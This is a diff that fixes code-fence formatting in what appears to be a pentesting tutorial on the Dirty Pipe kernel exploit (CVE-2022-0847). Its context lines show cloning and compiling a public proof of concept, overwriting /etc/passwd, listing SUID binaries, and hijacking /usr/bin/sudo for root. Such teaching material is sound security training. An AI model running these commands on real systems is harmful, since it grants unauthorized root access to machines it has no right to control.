@@ -12,8 +12,7 @@ To exploit this vulnerability, we need to download a [PoC](https://github.com/Al
 
 #### Download Dirty Pipe Exploit
 
-```
-        shellsession
+```shellsession
 cry0l1t3@nix02:~$ git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git
 cry0l1t3@nix02:~$ cd CVE-2022-0847-DirtyPipe-Exploits
 cry0l1t3@nix02:~$ bash compile.sh
@@ -23,8 +22,7 @@ After compiling the code, we have two different exploits available. The first ex
 
 #### Verify Kernel Version
 
-```
-        shellsession
+```shellsession
 cry0l1t3@nix02:~$ uname -r
 
 5.13.0-46-generic
@@ -32,8 +30,7 @@ cry0l1t3@nix02:~$ uname -r
 
 #### Exploitation
 
-```
-        shellsession
+```shellsession
 cry0l1t3@nix02:~$ ./exploit-1
 
 Backing up /etc/passwd to /tmp/passwd.bak ...
@@ -50,8 +47,7 @@ With the help of the 2nd exploit version (`exploit-2`), we can execute SUID bina
 
 #### Find SUID Binaries
 
-```
-        shellsession
+```shellsession
 cry0l1t3@nix02:~$ find / -perm -4000 2>/dev/null
 
 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
@@ -79,8 +75,7 @@ Then we can choose a binary and specify the full path of the binary as an argume
 
 #### Exploitation
 
-```
-        shellsession
+```shellsession
 cry0l1t3@nix02:~$ ./exploit-2 /usr/bin/sudo
 
 [+] hijacking suid binary..
